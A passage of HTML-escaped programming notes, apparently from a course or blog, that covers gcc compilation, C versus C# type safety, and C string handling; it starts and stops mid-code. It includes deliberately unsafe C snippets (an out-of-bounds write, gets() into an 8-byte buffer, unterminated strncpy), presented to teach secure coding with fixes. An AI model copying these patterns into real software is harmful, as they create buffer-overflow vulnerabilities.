function, pass title &amp;amp; name&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Bye %s %s\n&amp;quot;&lt;/span&gt;, argv[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;], argv[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]);  &lt;span class=&#34;comment&#34;&gt;// say “bye&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;Compiling C programs&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Compiling C programs&#34;&gt;#&lt;/a&gt; Compiling C programs&lt;/h2&gt;
Compiling C programs(Linux) Using gcc
&lt;ol&gt;
&lt;li&gt;To compile our  &lt;code&gt;meet.c&lt;/code&gt;  program, type&lt;/li&gt;
&lt;/ol&gt;
 &lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$gcc&lt;/span&gt; -o meet meet.c&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Then to execute the new program, type&lt;/li&gt;
&lt;/ol&gt;
 &lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ ./meet zz&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Commonly used gcc flags&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;-o &lt;filename&gt;: produces compiled binary file with filename (a.out by default).&lt;/li&gt;
&lt;li&gt;-S: produces assembly code in a file; saved with a .s extension&lt;/li&gt;
&lt;li&gt;-g, -ggdb: produces extra debugging information for gdb (GNU debugger)&lt;/li&gt;
&lt;li&gt;-c: compiles without linking; produces object files with an .o extension&lt;/li&gt;
&lt;li&gt;Check out manual by using: man gcc&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;32-bit vs 64-bit compilation&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;To compile into 32-bit binaries:&lt;/li&gt;
&lt;/ul&gt;
 &lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$gcc&lt;/span&gt; -m32 hello.c -o hello&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;install a standard library of&lt;/li&gt;
&lt;/ul&gt;
 &lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$sudo&lt;/span&gt; apt install gcc-multilib &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;C vs C#&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#C vs C#&#34;&gt;#&lt;/a&gt; C vs C#&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;C# is type-safe&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Strong static type system + runtime checks (e.g. bounds, type casts) + automatic memory management&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;C is type-unsafe&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Pointers + no runtime check (out-of-bound access, bad type casts), manual memory management&lt;br&gt;
Runtime array bounds check in C#&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If the following C# code is executed on .NET:&lt;/p&gt;
 &lt;figure class=&#34;highlight c#&#34;&gt;&lt;figcaption&gt;&lt;span&gt;(●ˇ∀ˇ●)&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt; arr[&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; arr[&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;] = &lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;An exception will be raised at runtime!&lt;/p&gt;
&lt;p&gt;The length of the array is recorded and checked by the runtime&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The length of an array is fixed once created&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;No runtime array bounds check in C, If the same C code is executed:&lt;/p&gt;
 &lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;(●ˇ∀ˇ●)&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; arr[&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; arr[&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;] = &lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;No error, result in a silent buffer overflow!&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Unexpected behaviours such as mysterious crashes depending on what was overwritten&lt;/li&gt;
&lt;li&gt;Attackers may exploit this if they can control the overwritten data&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Automatic memory management in C#&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Programmers do not write code to perform memory management tasks&lt;br&gt;
Garbage collector manages the allocation and release of memory&lt;br&gt;
C# has no common memory problems such as buffer overflow&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;C# strings&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;C# strings are  &lt;code&gt;objects&lt;/code&gt;  of the  &lt;code&gt;String&lt;/code&gt;  class&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Similar to an array of chars, but immutable&lt;/li&gt;
&lt;li&gt;The length is stored on the object for bounds checks at runtime&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;All string manipulation operations do not modify the original string&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A new string is created upon modification&lt;/li&gt;
&lt;li&gt;For example,  &lt;code&gt;str.Trim()&lt;/code&gt;  returns a new string&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;C strings&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;C strings are arrays of characters&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Terminated by and including the first occurrence of the null character  &lt;code&gt;\0&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;String length is not automatically tracked&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;It is determined by the number of bytes (character) preceding the null character.&lt;/li&gt;
&lt;li&gt;The memory required to store a string is the number of characters plus one&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;A string can be manipulated just like any other arrays&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;We usually use some built-in string functions in C libraries&lt;/li&gt;
&lt;/ul&gt;
 &lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;copy one string to another&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;    &lt;span class=&#34;comment&#34;&gt;// use string library     &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; str1[] = &lt;span class=&#34;string&#34;&gt;&amp;quot;Hello, Z&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; str2[&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;strcpy&lt;/span&gt;(str2, str1);  &lt;span class=&#34;comment&#34;&gt;// copy each character in str1 into str2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;The function  &lt;code&gt;strcpy&lt;/code&gt;  copies each character in the source string (a series of characters ending with and including a null character) into the destination string&lt;/p&gt;
 &lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;To compare two strings&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; str1[] = &lt;span class=&#34;string&#34;&gt;&amp;quot;hello&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; str2[] = &lt;span class=&#34;string&#34;&gt;&amp;quot;haxor&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;built_in&#34;&gt;strcmp&lt;/span&gt;(str1, str2) == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Strings are the same.\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Strings are different.\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;This code prints out: Strings are different.&lt;br&gt;
Note that the function  &lt;code&gt;strcmp()&lt;/code&gt;  does not return a  &lt;code&gt;boolean&lt;/code&gt;  result&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Zero represents false, anything else represents true&lt;/li&gt;
&lt;li&gt;No  &lt;code&gt;boolean&lt;/code&gt;  type in C language prior to C99&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;&lt;strong&gt;Other common string functions&lt;/strong&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9lbi53aWtpYm9va3Mub3JnL3dpa2kvQ19Qcm9ncmFtbWluZy9TdHJpbmdfbWFuaXB1bGF0aW9u&#34;&gt;More can be found&lt;/span&gt;&lt;br&gt;
 &lt;code&gt;strlen&lt;/code&gt; : gets the length of a string&lt;br&gt;
 &lt;code&gt;strncpy&lt;/code&gt; : copies one string to another with a bound&lt;br&gt;
 &lt;code&gt;strcat&lt;/code&gt; ,  &lt;code&gt;strncat&lt;/code&gt; : string concatenation&lt;br&gt;
 &lt;code&gt;gets&lt;/code&gt; ,  &lt;code&gt;fgets&lt;/code&gt; : receives input into a string&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;C strings is error prone&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#C strings is error prone&#34;&gt;#&lt;/a&gt;C strings is error prone&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Common string manipulation errors:&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Buffer errors&lt;/li&gt;
&lt;li&gt;Heap errors&lt;/li&gt;
&lt;li&gt;Out‐by‐bound errors&lt;/li&gt;
&lt;li&gt;Integer overflows&lt;/li&gt;
&lt;li&gt;Other memory, pointer and type errors&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;When data is copied from an unbounded source to a fixed‐length sink&lt;/strong&gt;&lt;/p&gt;
 &lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Unbounded string copy&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 	&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; username[&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 	&lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Please enter your username:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 	gets(username);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 	&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Your username is %s\n&amp;quot;&lt;/span&gt;, username);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;Use of  &lt;code&gt;gets()&lt;/code&gt;  Function&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The function  &lt;code&gt;gets()&lt;/code&gt;  reads input from the user into a buffer, but it does not check the length of the input against the buffer’s size.&lt;br&gt;
In this code, the  &lt;code&gt;username&lt;/code&gt;  array is only 8 bytes long. However,  &lt;code&gt;gets()&lt;/code&gt;  allows users to enter an input of any length, which means it can write beyond the 8 bytes allocated for  &lt;code&gt;username&lt;/code&gt; .&lt;br&gt;
This can cause a buffer overflow, which can lead to memory corruption, unexpected behavior, or even security vulnerabilities where attackers can execute arbitrary code.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Fixed-Length Buffer&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The username array is declared to have a size of 8, but we need to reserve one byte for the null-terminator  &lt;code&gt;\0&lt;/code&gt; , which marks the end of the string.&lt;br&gt;
This means only 7 characters can safely be stored in the username buffer.&lt;br&gt;
If the input exceeds this limit, it will overflow into adjacent memory, potentially causing the program to crash or behave unpredictably.&lt;/p&gt;
 &lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Unbounded string copy(fixed)&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; username[&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;];  &lt;span class=&#34;comment&#34;&gt;// Buffer limited to 8 bytes&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Please enter your username:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fgets(username, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(username), &lt;span class=&#34;built_in&#34;&gt;stdin&lt;/span&gt;);  &lt;span class=&#34;comment&#34;&gt;// Limit input size to prevent overflow&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Your username is %s\n&amp;quot;&lt;/span&gt;, username);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;  &lt;span class=&#34;comment&#34;&gt;// Standard return type&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;Better string functions from libraries&lt;/strong&gt;&lt;br&gt;
Should use functions that restrict the number of bytes for safer programming&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Use  &lt;code&gt;fgets()&lt;/code&gt; , instead of  &lt;code&gt;gets()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Use  &lt;code&gt;strncpy()&lt;/code&gt; , instead of  &lt;code&gt;strcpy()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Use  &lt;code&gt;strncat()&lt;/code&gt; , instead of  &lt;code&gt;strcat()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Use  &lt;code&gt;snprintf()&lt;/code&gt; , instead of instead of  &lt;code&gt;sprintf()&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Null‐termination errors&lt;/strong&gt;&lt;/p&gt;
 &lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Null‐termination errors&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *argv[])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; arr[&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;strncpy&lt;/span&gt;(arr, &lt;span class=&#34;string&#34;&gt;&amp;quot;0123456789&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(arr));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%s\n&amp;quot;&lt;/span&gt;, arr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;The array is not properly terminated by a null character!&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;When there is no null character among the first n character of the source, the string placed in the&lt;br&gt;
destination will not be null-terminated!&lt;br&gt;
The  &lt;code&gt;printf()&lt;/code&gt;  call prints out all bytes as character till reaching a null!&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;To test out, let’s add another array:&lt;/p&gt;
 &lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Null‐termination errors&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *argv[])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; arr[&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; arr2[&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;strncpy&lt;/span&gt;(arr, &lt;span class=&#34;string&#34;&gt;&amp;quot;0123456789&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(arr));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;strncpy&lt;/span&gt;(arr2, &lt;span class=&#34;string&#34;&gt;&amp;quot;9876543210&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(arr2));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%s\n&amp;quot;&lt;/span&gt;, arr);&lt;/span&gt;&lt;br&gt;&lt;span 